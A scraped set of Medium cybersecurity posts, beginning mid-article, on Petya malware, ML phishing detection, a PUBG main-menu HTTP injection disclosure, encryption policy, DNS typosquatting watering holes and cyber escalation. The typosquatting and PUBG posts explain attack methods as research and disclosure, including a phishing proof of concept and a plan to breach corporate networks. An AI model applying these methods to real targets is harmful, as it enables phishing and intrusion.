Lately, the number of attacks against Ukraine increased from Power Grids being shut down to the car a top military intelligence officer exploding yesterday — the day Petya.2017 infected Ukraine.
The fact of pretending to be a ransomware while being in fact a nation state attack — especially since WannaCry proved that widely spread ransomware aren’t financially profitable — is in our opinion a very subtle way from the attacker to control the narrative of the attack.
Additional note, come join Kaspersky & Comae tomorrow Thursday 29 @ 10AM EST for a technical webinar on Petya — no sales pitch. We promise ! Only technical stuff.
Written by
","['Products', 'Labs', 'Events', 'Hire Comae', 'hash command', 'Security', 'Comae', 'Wannacry', 'Hackers', 'Cybersecurity']"
Petya— Enhanced WannaCry ? - Comae Technologies,https://blog.comae.io/byata-enhanced-wannacry-a3ddd6c8dabb?source=tag_archive---------9-----------------------,"Yes, this is bad — real bad — this is another ransom-ware leveraging SMB network kernel vulnerabilities to spread on the local network. The exploit used is based on ETERNALBLUE NSA’s exploit leaked by TheShadowBrokers in April, 2017. Similar to WannaCry. No kill-switch this time. (& stop hoping for one)
Update: The initial infection vector seem to have been a rogue update pushed by the attackers via the Ukranian accounting software Me-Doc.
Update2: Microsoft published a complete and detailed analysis of the ransomware.
Comae Team dubbed this malware: Byata
Thanks to Costin for sharing the 71b6a493388e7d0b40c83ce903bc6b04hash.
The attackers xored (0xcc) the shellcode to make sure the signature does not automatically get detected by anti-virus. Very simple trick which is very efficient which shows how easy it is to bypass signature-based anti viruses.
Another thing we can notice is that the attackers rewrote the kernel exploit properly. Below is the definition of a function that builds SMBv1 header packets.
The code is definitely cleaner.
65 different file types are targeted by the ransomware.
Logs are also being deleted.
Written by
","['Products', 'Labs', 'Events', 'Hire Comae', 'Programming', 'Wannacry', 'Cybersecurity', 'Hacking']"
Phishing URL Detection with ML - Towards Data Science,https://towardsdatascience.com/phishing-domain-detection-with-ml-5be9c99293e5?source=tag_archive---------0-----------------------,"Phishing is a form of fraud in which the attacker tries to learn sensitive information such as login credentials or account information by sending as a reputable entity or person in email or other communication channels.
Typically a victim receives a message that appears to have been sent by a known contact or organization. The message contains malicious software targeting the user’s computer or has links to direct victims to malicious websites in order to trick them into divulging personal and financial information, such as passwords, account IDs or credit card details.
Phishing is popular among attackers, since it is easier to trick someone into clicking a malicious link which seems legitimate than trying to break through a computer’s defense systems. The malicious links within the body of the message are designed to make it appear that they go to the spoofed organization using that organization’s logos and other legitimate contents.
In this article I explain: phishing domain (or Fraudulent Domain) characteristics, the features that distinguish them from legitimate domains, why it is important to detect these domains, and how they can be detected using machine learning and natural language processing techniques.
Many users unwittingly click phishing domains every day and every hour. The attackers are targeting both the users and the companies. According to the 3rd Microsoft Computing Safer Index Report, released in February 2014, the annual worldwide impact of phishing could be very high as $5 billion.
What is the reason of this cost?
The main reason is the lack of awareness of users. But security defenders must take precautions to prevent users from confronting these harmful sites. Preventing these huge costs can start with making people conscious in addition to building strong security mechanisms which are able to detect and prevent phishing domains from reaching the user.
Lets check the URL structure for the clear understanding of how attackers think when they create a phishing domain.
Uniform Resource Locator (URL) is created to address web pages. The figure below shows relevant parts in the structure of a typical URL.
It begins with a protocol used to access the page. The fully qualified domain name identifies the server who hosts the web page. It consists of a registered domain name (second-level domain) and suffix which we refer to as top-level domain (TLD). The domain name portion is constrained since it has to be registered with a domain name Registrar. A Host name consists of a subdomain name and a domain name. An phisher has full control over the subdomain portions and can set any value to it. The URL may also have a path and file components which, too, can be changed by the phisher at will. The subdomain name and path are fully controllable by the phisher. We use the term FreeURL to refer to those parts of the URL in the rest of the article.
The attacker can register any domain name that has not been registered before. This part of URL can be set only once. The phisher can change FreeURL at any time to create a new URL. The reason security defenders struggle to detect phishing domains is because of the unique part of the website domain (the FreeURL). When a domain detected as a fraudulent, it is easy to prevent this domain before an user access to it.
Some threat intelligence companies detect and publish fraudulent web pages or IPs as blacklists, thus preventing these harmful assets by others is getting easier. (cymon, firehol)
The attacker must intelligently choose the domain names because the aim should be convincing the users,and then setting the FreeURL to make detection difficult. Lets analyse an example given below.
Although the real domain name is active-userid.com, the attacker tried to make the domain look like paypal.com by adding FreeURL. When users see paypal.com at the beginning of the URL, they can trust the site and connect it, then can share their sensitive information to the this fraudulent site. This is a frequently used method by attackers.
Other methods that are often used by attackers are Cybersquatting and Typosquatting.
Cybersquatting (also known as domain squatting), is registering, trafficking in, or using a domain name with bad faith intent to profit from the goodwill of a trademark belonging to someone else. The cybersquatter may offer selling the domain to a person or company who owns a trademark contained within the name at an inflated price or may use it for fraudulent purposes such as phishing. For example, the name of your company is “abcompany” and you register as abcompany.com. Then phishers can register abcompany.net, abcompany.org, abcompany.biz and they can use it for fraudulent purpose.
Typosquatting, also called URL hijacking, is a form of cybersquatting which relies on mistakes such as typographical errors made by Internet users when inputting a website address into a web browser or based on typographical errors that are hard to notice while quick reading. URLs which are created with Typosquatting looks like a trusted domain. A user may accidentally enter an incorrect website address or click a link which looks like a trusted domain, and in this way, they may visit an alternative website owned by a phisher.
A famous example of Typosquatting is goggle.com, an extremely dangerous website. Another similar thing is yutube.com, which is similar to goggle.com except it targets Youtube users. Similarly, www.airfrance.com has been typosquatted as www.arifrance.com, diverting users to a website peddling discount travel. Some other examples; paywpal.com, microroft.com, applle.com, appie.com.
There are a lot of algorithms and a wide variety of data types for phishing detection in the academic literature and commercial products. A phishing URL and the corresponding page have several features which can be differentiated from a malicious URL. For example; an attacker can register long and confusing domain to hide the actual domain name (Cybersquatting, Typosquatting). In some cases attackers can use direct IP addresses instead of using the domain name. This type of event is out of our scope, but it can be used for the same purpose. Attackers can also use short domain names which are irrelevant to legitimate brand names and don’t have any FreeUrl addition. But these type of web sites are also out of our scope, because they are more relevant to fraudulent domains instead of phishing domains.
Beside URL-Based Features, different kinds of features which are used in machine learning algorithms in the detection process of academic studies are used. Features collected from academic studies for the phishing domain detection with machine learning techniques are grouped as given below.
URL is the first thing to analyse a website to decide whether it is a phishing or not. As we mentioned before, URLs of phishing domains have some distinctive points. Features which are related to these points are obtained when the URL is processed. Some of URL-Based Features are given below.
The purpose of Phishing Domain Detection is detecting phishing domain names. Therefore, passive queries related to the domain name, which we want to classify as phishing or not, provide useful information to us. Some useful Domain-Based Features are given below.
Page-Based Features are using information about pages which are calculated reputation ranking services. Some of these features give information about how much reliable a web site is. Some of Page-Based Features are given below.
Some Page-Based Features give us information about user activity on target site. Some of these features are given below. Obtaining these types of features is not easy. There are some paid services for obtaining these types of features.
Obtaining these types of features requires active scan to target domain. Page contents are processed for us to detect whether target domain is used for phishing or not. Some processed information about pages are given below.
By analysing these information, we can gather information such as;
All of features explained above are useful for phishing domain detection. In some cases, it may not be useful to use some of these, so there are some limitations for using these features. For example, it may not be logical to use some of the features such as Content-Based Features for the developing fast detection mechanism which is able to analyze the number of domains between 100.000 and 200.000. Another example would be, if we want to analyze new registered domains Page-Based Features is not very useful. Therefore, the features that will be used by the detection mechanism depends on the purpose of the detection mechanism. Which features to use in the detection mechanism should be selected carefully.
Detecting Phishing Domains is a classification problem, so it means we need labeled data which has samples as phish domains and legitimate domains in the training phase. The dataset which will be used in the training phase is a very important point to build successful detection mechanism. We have to use samples whose classes are precisely known. So it means, the samples which are labeled as phishing must be absolutely detected as phishing. Likewise the samples which are labeled as legitimate must be absolutely detected as legitimate. Otherwise, the system will not work correctly if we use samples that we are not sure about.
For this purpose, some public datasets are created for phishing. Some of the well-known one is PhishTank. These data sources are used commonly in academic studies.
Collecting legitimate domains is another problem. For this purpose, site reputation services are commonly used. These services analyse and rank available websites. This ranking may be global or may be country-based. Ranking mechanism depends on a wide variety of features. The websites which have high rank scores are legitimate sites which are used very frequently. One of the well-known reputation ranking service is Alexa. Researchers are using top lists of Alexa for legitimate sites.
When we have raw data for phishing and legitimate sites, the next step should be processing these data and extract meaningful information from it to detect fraudulent domains. The dataset to be used for machine learning must actually consist these features. So, we must process the raw data which is collected from Alexa, Phishtank or other data resources, and create a new dataset to train our system with machine learning algorithms. The feature values should be selected according to our needs and purposes and should be calculated for every one of them.
There so many machine learning algorithms and each algorithm has its own working mechanism. In this article, we have explained Decision Tree Algorithm, because I think, this algorithm is a simple and powerful one.
Initially, as we mentioned above, phishing domain is one of the classification problem. So, this means we need labeled instances to build detection mechanism. In this problem we have two classes: (1) phishing and (2) legitimate.
When we calculate the features that we’ve selected our needs and purposes, our dataset looks like in figure below. In our examples, we selected 12 features, and we calculated them. Thus we generated a dataset which will be used in training phase of machine learning algorithm.
A Decision Tree can be considered as an improved nested-if-else structure. Each features will be checked one by one. An example tree model is given below.
Generating a tree is the main structure of detection mechanism. Yellow and elliptical shaped ones represent features and these are called nodes. Green and angular ones represent classes and these are called leaves. The length is checked when an example arrives and then the other features are checked according to the result. When the journey of the samples is completed, the class that a sample belongs to will become clear.
Now, the most important question about Decision Trees is not answered yet. The question is that which feature will be located as the root? and which ones must come after the root? Choosing features intelligently effects efficiency and success rate of algorithms directly.
So, how does decision tree algorithm select features?
Decision Tree uses a information gain measure which indicates how well a given feature separates the training examples according to their target classification. The name of the method is Information Gain. The mathematical equation of information gain method is given below.
High Gain score means that the feature has a high distinguishing ability. Because of this, the feature which has maximum gain score is selected as the root. Entropy is a statistical measure from information theory that characterizes (im-)purity of an arbitrary collection S of examples. The mathematical equation of Entropy is given below.
Original Entropy is a constant value, Relative Entropy is changeable. Low Relative Entropy Score means high purity, likewise high Relative Entropy Score means low purity. As we move down the tree, we want to increase the purity, because high purity on the leaf implies high success rate.
In the training phase, dataset is divided into two parts by comparing the feature values. In our example we have 14 samples. “+” sign representing phishing class, and “-” sign representing legitimate class. We divided these samples into two parts according to the length feature. Seven of them settle right, the other seven of them settle left. As shown in the figure below, right part of tree has high purity, so it means low Entropy Score (E), likewise left part of tree has low purity and high Entropy Score (E). All calculations were done according to the equations given above. Information Gain Score about the length feature is 0,151.
The Decision Tree Algorithm calculates this information for every feature and selects features with maximum Gain scores. To growth the tree, leaves are changed as a node which represents a feature. As the tree grows downwards, all leaves will have high purity. When the tree is big enough, the training process is completed.
The Tree created by selecting the most distinguishing features represents model structure for our detection mechanism. Creating mechanism which has high success rate depends on training dataset. For the generalization of system success, the training set must be consisted of a wide variety of samples taken from a wide variety of data sources. Otherwise, our system may working with high success rate on our dataset, but it can not work successfully on real world data.
Written by
","['Data Science', 'Machine Learning', 'Programming', 'Visualization', 'AI', 'Journalism', 'More', 'Contribute', 'Security', 'Artificial Intelligence', 'Machine Learning', 'Cybersecurity', 'Phishing']"
PlayerUnknown’s Battlegrounds Main Menu Is Vulnerable to Hacking,https://medium.com/hackernoon/playerunknowns-battlegrounds-main-menu-is-vulnerable-to-hacking-d483b00a7036?source=tag_archive---------0-----------------------,"Update: This security hole has been plugged. See my next post for details.
Update update: There was a false-alarm report that this problem returned. Read about it here.
PlayerUnknown’s Battlegrounds (or PUBG for short) is a new, extremely popular video game. It focuses around “battle royale” gameplay, pitting up to 100 players against each other in a fight to be the last one standing.
The game and its developer (Bluehole) are very ambitious, and have been wildly successful with PUBG. Despite the game not yet being officially “released”, it has topped two million concurrent players, made tens of millions of dollars, and has a burgeoning e-Sports presence. This sort of exposure and success comes with certain expectations — performance, stability, visuals, AAA-competitive marketing, etc — which have not always been met. This article is not about them; it’s about security.
First, let’s look at the very basics of the problem. What is it, how big of a deal is it, and what does it mean to you?
The PUBG main menu is a webpage loaded remotely in an unsecured HTTP connection, making it vulnerable to cross-site scripting (XSS) via a man-in-the-middle (MITM) attack, or other ways to mess up HTTP requests. This means very easy and credible phishing, spying on user behavior, plus other possible attack angles.
Again, in English this time… The PUBG loading screen and the various user interface elements in its main menu are not technically part of the game you (a player) “install”. When you launch the game, they are fetched from an official server and rendered on top of the actual game (the 3D model of your character standing around). This rendering is done via a transparent “browser” that treats them as if they were an actual webpage.
The connection through which these elements are loaded is not secure. That means that, while the data is moving from the PUBG server to your computer, it can be intercepted and modified. In other words, someone operating any part of the connection between you and the PUBG server could manipulate the data and change what you see in your main menu, or make the main menu do things it normally would not — for example, report what in-game items you own to a third party.
That sounds serious. Why are you making this public? It is indeed serious. Normally I would not make such a big deal over a bug in an “early access” game, but as I mentioned earlier, PUBG is itself a big deal. Early access or not, this bug impacts the security of tens of millions of people. I have already reported the bug with Bluehole’s support and their forums more than two weeks ago. As it was not fixed expeditiously, and is a serious issue, I feel it is my responsibility to inform the community of the risk.
What is the actual danger to players? For a hacker to take advantage of this vulnerability, they need to either have malware already on your computer (in which case you have bigger problems) or they need to be a “middle-man” in between you and PUBG. That means that, if you are doing any of these things, you are at risk:
If a hacker does manage to take advantage of this, they can at the very least modify what you see on your screen, easily making it look like an official part of PUBG.
I even went ahead and created a proof of concept. After seeing the animated Bluehole splash screen and the game music starts, you could be confronted with this:
Looks very official, right? It’s completely fake, and delivered from a server completely unrelated to PUBG or Bluehole, and could send me your login details if you input them (it does not, though).
It is also possible there are far more nefarious things for the hacker to do. I am not a security researcher and do not have enough code access to say for sure. At the very least, this security hole has been used by Xfinity to advertise inside the game itself.
What’s the next step? Short of not playing PUBG at all, there is little way for players to completely avoid this risk. To reduce it as much as you can, only play on your home network, using a wired connection, or wireless if your router is not in range of any potential hackers.
More importantly though, this needs to be fixed as soon as possible. Since PUBG is “being developed with community feedback” (according to its Steam page) it needs your feedback on this issue for it to be tackled in a timely fashion. Please drop a word to the developers in their forums, in a review, or on social media. With your help, PUBG’s security can be as impenetrable as this pan:
This is where we get into the technical weeds. If you’re not interested, please feel free to tune out.
I have a confession: I did not find this issue by myself. I was tipped off by a friend who pointed me to a post someone made on the PUBG forums more than six months ago, complaining that Xfinity is able to inject ads into the main menu, as they do with other insecure websites. Their shady ISP practices aside, this is a massive red flag. Shockingly, the issue was not addressed at all, and the thread ended with a resounding “meh”:
Being a web (-ish) developer myself, this piqued my curiosity so I dug into it.
Doing so, I found that every time the game loads, a HTTP GET request is sent to http://front.battlegroundsgame.com/index.html. Its contents?
That’s it. That’s what loads the entire UI.
Not only is it not valid HTML in the first place, and served over a completely unsecured plain HTTP connection, but this would be bad practice even if those things weren’t a problem!
Naturally, I continued down the rabbit hole by loading that URL in a browser:
Loading that URL actually loaded the PUBG UI! It also produced a wealth of information from looking at the queries themselves:
The Javascript files themselves are minified, so gleaning much from them is difficult… but not impossible. There’s some fun stuff in there:
Also, here’s some fun for social justice activists: the player objects have a default gender (male) and other physical properties, and various tokens that didn’t get minified have a weird “bro” related naming theme:
Then, as the cherry to top it off, the console log contains confidence-inspiring lines such as:
I don’t know what that’s about. Anyway… It looks like how I’d expect an “early access” code base to look. That unsecured HTTP request is a much bigger deal, so… Back to security talk!
Given that I know that the HTTP flaw I found can be exploited, I hastened to write a bug report to Bluehole about it. Going to their support site, I found that…
… it does not use secure communications itself, and for an authentication page, at that. That does not bode well.
I reported it anyway, and within a day I got a response from a Game Master acknowledging the report and requesting that I share it on the PUBG forums as well. The public PUBG forums. The ones where the whole world could see the problem. I did, and it seems to have gotten a similar amount of attention as the thread that got me on this track in the first place.
Given that there’s been an ample amount of time since the first mention of this issue to come up with a fix — or at least, a stopgap to not expose literally millions of players to hacking — here I am doing this write-up.
It is not just a write-up, though! For I have…
There were some screenshots of it before, but here it is in all its glory: https://github.com/fsufitch/pubg-mainmenu-hack. Update: I remembered to actually set the repository to “public” and it should actually be accessible now.
Disclaimer: this is not some of my best coding work. It’s messy and terrible, but it works. Do not code like this.
It consists of a simple Go-based server that serves an index.html file, loading a bunch of “evil” JS code that injects itself into the UI, attempting to phish the user. Of course, I am not actually saving anyone’s info, and the “login” form is a dummy, but it does provide a striking visual:
This hacked UI is live and available at http://104.239.228.225/index.html. (Update: I have disabled the server since it is no longer relevant but is still costing me to keep running.) You can visit it with a web browser, or you can fool your own PUBG into loading it by adding the following line to your hosts file:
That is found at %SystemRoot%\System32\drivers\etc\hosts for a Windows environment. Removing the line will disable the hack.
If you really don’t feel like editing that file, I put together a simple program that does it for you. It’s super suggestively named, just like malware that could do this without your knowledge. Instead of compromising your computer though, all it does is add the hosts line, wait for you to push Enter, then remove the line.
Edit: Some comments I have received indicated that a hosts-file injection is not a “real” vulnerability, as a ton of things are vulnerable to that.While true, this hosts injection is a simple way to demo this problem, since an easy-to-apply, portable MITM demo is much harder to put together.
That’s the end of the PUBG security adventure… For now. Here’s hoping that Bluehole will continue improving PUBG on all fronts, stop putting users at risk, and become truly “e-Sports ready”. Thanks for reading!
Written by
","['About', 'Help', 'Go Home', 'recent', 'revelations', 'Coherent UI', 'Angular 4', 'XunYou', 'Redux,', 'browser extension', 'Security', 'Pubg', 'Gaming', 'Hacking', 'Cybersecurity']"
Por que 2016 será um ano decisivo para a criptografia e para a cibersegurança em todo o planeta?,https://iopub.org/por-que-2016-ser%C3%A1-um-ano-decisivo-para-a-criptografia-e-para-a-ciberseguran%C3%A7a-em-todo-o-planeta-c0191eb5e9ff?source=tag_archive---------6-----------------------,"Um dos assuntos mais comentados nos últimos dias foi a rejeição — por parte da Apple — de uma ordem judicial que, a pedido do FBI, solicitava que a empresa colaborasse na investigação do atentado de San Bernardino, ocorrido no ano passado. A agência conseguiu recuperar o smartphone de um dos atiradores (um iPhone 5C) e pediu, através da corte da Califórnia, que a Apple desenvolvesse uma ferramenta capaz de quebrar a segurança do aparelho. Em uma carta aberta, o CEO da empresa, Tim Cook, chamou o pedido de “precedente perigoso” e alertou para as consequências de solicitações como estas para o futuro da segurança e da privacidade dos cidadãos do país.
A grande repercussão do pedido da Corte (e da resposta de Cook) pode ser tomada como um indício de que estamos mais atentos à importância da criptografia e ao valor das nossas informações pessoais. Mas será que estamos mesmo?
Há muito mais acontecendo nos EUA. Enquanto você lê esse texto, o diretor do FBI está pressionando o governo para conseguir mais verba para “desenvolver e adquirir ferramentas para descriptografar informações”. No Congresso, deputados e senadores apresentam leis pró e contra backdoors, pró e contra a quebra da privacidade na web, sob diferentes argumentos.
Por lá, a cibersegurança será um dos grandes temas de 2016. E isso é da nossa conta.
James Comey, atual diretor do FBI, tem sido bastante verbal sobre as dificuldades que seus agentes estão encontrando para dar prosseguimento a investigações, quando se deparam com sistemas encriptados.
A solução para o problema — além de pedir liminares na justiça obrigando as empresas a quebrarem a própria segurança — seria aumentar em US$ 38 milhões o orçamento de 2017, dinheiro que complementa os US$ 31 milhões extras que ele já havia solicitado no ano passado para o orçamento de 2016.
Os recursos seriam destinados a “desenvolver e adquirir” ferramentas para descriptografar informações, desmascarando “usuários que se escondem atrás de ferramentas de encriptação”, o que teria sido o caso dos autores do atentado em San Bernardino, segundo Comey.
Mas há um detalhe: no caso em questão, o iPhone do atirador estava protegido com a mesma tecnologia de outras dezenas de milhões de iPhones ao redor do mundo cujos proprietários, até que se prove o contrário, não estão planejando nenhum tipo de atentado.
Imagine que a Apple decida cumprir a ordem judicial e colabore com o FBI. De posse da ferramenta, o FBI provavelmente conseguiria quebrar a senha do aparelho do atirador. Digamos que ali exista, de fato, algo que ajude a esclarecer o caso. Vamos exagerar um pouco: digamos que exista algo que ligue o autor do atentado a um grupo extremista secreto sediado nos EUA e que, de posse das informações do telefone, o FBI consiga desbaratar o grupo.
Nesse cenário, o que impediria que o FBI adotasse essa estratégia em outras investigações? Ou ainda, o que impediria que outros governos obrigassem a Apple, ou outras fabricantes de equipamentos, a atender as mesmas demandas de suas polícias locais?
E não se esqueça, mesmo que a Apple realmente não colabore com o FBI, a agência já tem garantidos US$ 31 milhões extras para o combate à criptografia.
Como e onde eles vão gastar esse dinheiro? Impossível determinar…
Com diferentes argumentos, deputados e senadores apresentam projetos de lei que tentam regulamentar o uso de ferramentas criptográficas.
De um lado há os que enxergam a criptografia apenas como uma barreira para a segurança nacional, um empecilho para o bom funcionamento da justiça, uma ferramenta para ocultar criminosos.
Neste time está a senadora californiana Dianne Feinstein. Em dezembro de 2015 ela disse ao Comitê Judiciário do Senado que “buscaria uma legislação que daria à polícia, munida de mandado judicial, a habilidade de investigar a web encriptada”.
“Eu me preocupo com o PlayStation que meus netos usam. Me preocupo com um predador entrando em contato com eles e que essa conversa seja criptografada. Eu acredito que existe um motivo para que, com uma ordem judicial, eu possa ver essa conversa”
Seu argumento para a proposta tem forte apelo popular, ao mesmo tempo em que também abre precedentes potencialmente perigosos.
Pelo meio do caminho, propondo debates mais amplos, está o congressista Michael McCaul. O deputado texano, presidente do Comitê de Segurança Interna da Câmara, pretende colocar em pauta uma legislação que criaria um “comitê nacional para atender os desafios da Era Digital em segurança e tecnologia”. Em um discurso de 2015 na National Defense University, ele afirmou que a comissão “juntaria o setor de tecnologia, de privacidade, grupos de direitos civis, acadêmicos e as forças da lei para encontrar um senso comum”.
A iniciativa foi motivada pelo atentado de Paris, além do de San Bernadino, também ocorrido em 2015. “Nós não podemos parar o que não podemos ver”, disse o deputado.
Apesar da motivação, não há evidências de que a criptografia tenha desempenhado um papel importante em qualquer um dos atentados.
Finalmente, com o objetivo de criar uma política nacional para as relações entre os estados da federação envolvendo tecnologia criptográfica, congressistas apresentaram no dia 10/02 o ENCRYPT Act. ENCRYPT é acrônimo em inglês para “garantindo direitos constitucionais federais para telecomunicações privadas” em tradução livre.
Com o Ato federal, os congressistas esperam evitar que as leis estaduais que estabelecem os padrões criptográficos se tornem, nas palavras da deputada Suzan DelBene — uma das autoras do projeto — uma “colcha de retalhos legislativa em relação à criptografia que nos deixará inseguros”.
Dois exemplos da fragilidade desse tipo de legislação estadual: na California, em janeiro deste ano, foi apresentado um projeto de lei, propondo o banimento de sistemas criptográficos em todos os smartphones vendidos no estado. E em Nova York, um deputado propôs uma lei determinando que todos os smartphones vendidos no estado possam ser descriptografados e/ou desbloqueados pelos seus fabricantes.
Enquanto nos EUA a criptografia e a segurança da informação são tema de debate e declarações em agências de investigação, congresso, tribunais e na Casa Branca, boa parte dos governos do mundo age como espectadores, limitando suas opiniões sobre o tema a momentos de grande comoção pública, como após o atentado de Paris, quando agências de segurança, promotores e congressistas em vários países levantaram a velha bandeira da vigilância a todo custo, capitalizando no medo e no pânico para propor leis que tolhem a liberdade e o direito à privacidade.
É preciso reconhecer que o debate avança nos EUA (ou pelo menos está em pauta) o que não é necessariamente bom, pois por si só a condição se converte em uma ameaça. O tema está sendo vigorosamente debatido em caráter doméstico, como se as decisões a respeito do que cada cidadão do planeta faz com a tecnologia pudessem ser tomadas por somente um país.
Eles possuem o privilégio de controlar boa parte da comunicação e dos serviços na internet, mas esse debate sobre criptografia precisa ser internacional.
Ainda mais quando os atores envolvidos nos EUA comportam-se de forma incoerente em situações diversas.
Um artigo recente conta como a Apple concordou em colaborar em pelo menos 70 outras investigações realizadas por diversas instâncias do governo desde 2008, contrariando boa parte do que Tim Cook afirmou em sua carta de 16 de fevereiro.
Pelo menos um desses casos — uma investigação sobre o tráfico de metanfetamina em Nova York — traz reviravoltas que expõe ambiguidades no discurso de Cook. Inicialmente, a empresa se recusou a quebrar a senha do aparelho de Nova York, da mesma forma que se recusou a fazê-lo no caso de San Bernardino.
Posteriormente reconheceu que o iPhone do caso novaiorquino usava uma versão do sistema operacional (versão 7) que permitia à empresa acessar — sem qualquer conflito ético — “certas informações não criptografadas” sem precisar quebrar a senha.
A Apple é uma corporação. Como tal, depende de que as pessoas consumam seus produtos, sua marca, sua “ideia”. O caso acima prova que a resposta de Tim Cook à ordem judicial recente foi uma reação calculada de uma corporação preocupada com a sua imagem em um mercado pós-revelações de Edward Snowden.
Mas não, a Apple não está sozinha.
Oficiais de justiça também apresentaram sua cota de informações desencontradas. Um promotor do caso teria reconhecido que “uma das agências de investigação dos EUA já desenvolveu uma tecnologia para quebrar a segurança de alguns modelos de iPhone sem precisar de assistência da Apple”. A mesma assistência que o FBI pediu à Apple via ordem judicial.
Há muito em jogo. Corporações já perceberam que a estratégia dos governos pode prejudicar sua imagem e, consequentemente, suas vendas. Do lado dos governos, a situação é ainda mais delicada. Eles precisam manter e criar políticas que os permita fazer o que sempre fizeram: espionar inimigos e potenciais inimigos estejam onde estiverem, e ao mesmo tempo convencer o povo que a segurança depende do quanto eles sabem de cada um.
No meio de tudo isso, estamos eu e você.
Siga-nos no Facebook, Twitter e Linkedin. Assine nossa newsletter e receba novidades toda a semana.
Written by
","['Hacking', 'InfoSec', 'Eventos', 'Viagens & Turismo', 'Zen Habits', 'Cybersecurity', 'Io', 'Privacidade']"
Practical waterholing through DNS typosquatting - Just another infosec blog type of thing,https://blog.0day.rocks/practical-waterholing-through-dns-typosquatting-e252e6a2f99e?source=tag_archive---------2-----------------------,"Because not everyone has QUANTUM capabilities, a poor man’s gotta think about ways of getting inside a target network on the cheap, right?Typosquatting has been known and abused since the 90’s, mostly for phishing, but is it still profitable for water-hole kind of attacks? Let’s find out!
How often did you type google.co instead of google.com? I hate it when this happens to me, but it’s fairly regular. And it happens everyday to thousands of people out there. So my main idea was to lookup for popular .com websites that has available .co domains and see how bad it can get : testing the scenario of a malicious typosquatted domain hosting an exploit kit. A poor man’s QUANTUM.
For example, the simple omission of a character could be abused with these country top-level domains:.com -> .cm (TLD of Cameroon).com -> .co (TLD of Colombia).com -> .om (TLD of Oman).net -> .ne (TLD of Niger).net -> .et (TLD of Ethiopia)…
You got the idea, there are plenty of domains we could use! For this experiment I’ll use the TLD of Colombia (.co).
Let’s grab the top Alexa websites and look for available domains.
Getting the most popular websites is quite easy, here is how to get the top 2000 .com domains:
$ wget http://s3.amazonaws.com/alexa-static/top-1m.csv.zip$ unzip top-1m.csv.zip$ cut -d”,” -f 2 top-1m.csv | grep “com$” | rev | cut -d”.” -f 1,2 | uniq | rev | head -n 2000 > top-2000.com.txt
I developed a small Python script to check for domain availability in bulk : 320 .co domains were available out of the top 2000 .com domains (16%). I picked 8 of them for my test, they looked like good candidates (most of the top were ad trackers that people don’t manually type in the address bar, so I removed them out). They all are within the 500th and 1000th most visited website of the world — which should gives us enough room to work with.
I bought myself a cheap VPS on CockBox for this test (got this sweet IP address geolocated in the Seychelles which is both cool and shady as fuck �). Setting up a webserver to host the page that will redirect victims is fairly easy (I just installed PHP/MySQL to run a Piwik analytics platform).
The idea is to make incoming visitors load an innocuous JavaScript code and redirect them gently to the intended .com website. Something like this works fine:
So now we have all our domain names set up and a server waiting for new victims to come by, sweet!
Pros: it’s rather stealthy, not e-mail based and victims are most likely not going to see what’s happening.Cons: random results + wait time.
This experiment lasted 40 days and I got 5430 entries on my log file. Most were crawlers and bots, filtering that out I got 1765 page requests counting 916 unique IP addresses (approximately 23/day) landing on the watering hole server. Looking at the User-Agents, those were actual browsers — people manually typing the URL on the address bar and got the domain wrong, it works!
Sadly, only 392 unique visitors loaded my Piwik JavaScript code. I suspect I got this low result because most people have ad blockers/privacy plugins enabled. Which is kind of a good news, though had I used an actual exploit kit that would have been yet another story…
Interestingly, some “hijacked” domains are producing very local results. A typosquatted Iranian news website is giving a lot of connections coming from Iran, as expected (on the right we can see more than 50% of the traffic was coming from Iran).
The actual cost of this attack is around $0.05 per click (unique IP), which is cheaper than average advertising PPC (Pay-per-click) for an e-commerce website. As the typosquatted domains I picked are quite popular you could expect different results on other less known domains, but still, very profitable!
Worth noting, more than 800 connections were made from WhatsApp clients (simple GET / on my watering hole server). Side effect of this research, I suspect this happens when somebody type a complete URL. WhatsApp is known to fetch the website for each keystroke, char-by-char (1 request per keystroke).Through this data leak, I’m able to see all the IP addresses of people typing one of the 8 real domains I typosqatted on WhatsApp (IP + timestamp), reaching my .co before writing the final M. That’s a terrible privacy issue… *insert facepalm.gif here*
We have seen active DNS typosquatting campaigns, notably in Russia, targeting various VPN and hosting providers (credits to dustyfresh for the discovery �).The scheme is very smart, they register large amount of typosquatted domains that will be injecting their affiliate ID into a 302 redirect to the legitimate website. Almost invisible to the victim, the attacker will share a part of the profit when the user buys anything from the visited website.It was confirmed that one group has made $400 this way for one abused company (among many others).
From the statistics we can tell it’s rather unlikely that someone will abuse this to massively spread ransomware, although we have demonstrated it can be used for targeted or opportunistic attacks, whether for fraud or corporate espionage.For instance, a threat actor might want to use this to infect a computer inside a corporate LAN. Let’s say you’re targeting Random Big Corp and they have a few internal and external domain names, I bet you could buy yourself a few dozens typosquatted domains and get inside in less than a month. Just have to wait a few days/weeks until someone will make a mistake and boom infected[1]: you’re now inside. That’s a very likely scenario.
[1] 0days not included — but phishing works very well too ;-)
You shall begin with the standard corporate security and best practices (first things first!): log everything, including DNS requests. Then, you could set up alerts upon any access to a newly registered domain name (< 3 months). Most likely you are going to get a lot of alerts but that’s really something to look for, in conjunction with a Levenshtein distance on your domains you can dismiss a lot of false positives.If you want to be more proactive (go red team!), you should definitely give dnstwist a go:
Thanks to @scriptjunkie1 who gave me the idea to do this research. If you’re interested about other typo attacks, check out his slides from OPCDE 2017!
Written by
","['DNS', 'Cybersecurity', 'Cybercrime', 'Vulnerability', 'Python']"
Premature Cyber Escalation - thaddeus t. grugq - Medium,https://medium.com/@thegrugq/premature-cyber-escalation-7b2b377687eb?source=tag_archive---------9-----------------------,"US CYBERCOM launched a powerful widespread cyber attack against Iranian missile command and control (C&C) assets. This attack caused a denial of service that is so severe Iran will need a long time to recover their former capabilities. It was the least effective, most self defeating, cyber attack since a script kiddy hacked and wiped that system behind 127.0.0.1.
[Support more content like this.]
This framing of the attack as a calculated atttack to cause damage to Iranian missile C&C assets that’ll be time consuming and costly to repair, is very literally crazy talk. An analogy: a threat actor hacks a company, and on Friday, bust before the end of the work day, they delete MS Office from every computer. The cost to the company is minimal as no one would be working over the weekend. No one except the poor IT staff who have to clean up the mess anyway. For the company the cost they pay is “unpleasant weekend for IT staff, and overtime money.” On the other hand, the company learns a great deal about their vulnerabilities, their risk exposure, and how to deal with a similar attack in future.
At the cost of some inconvenience for some people, and a bit of money, the company learned a lot of valuable information about their weaknesses. They can now take remedial action to prevent it from happening again, and create processes and procedures to reduce the burden of recovering from such an attack. From any perspective, it’s a great bargain.
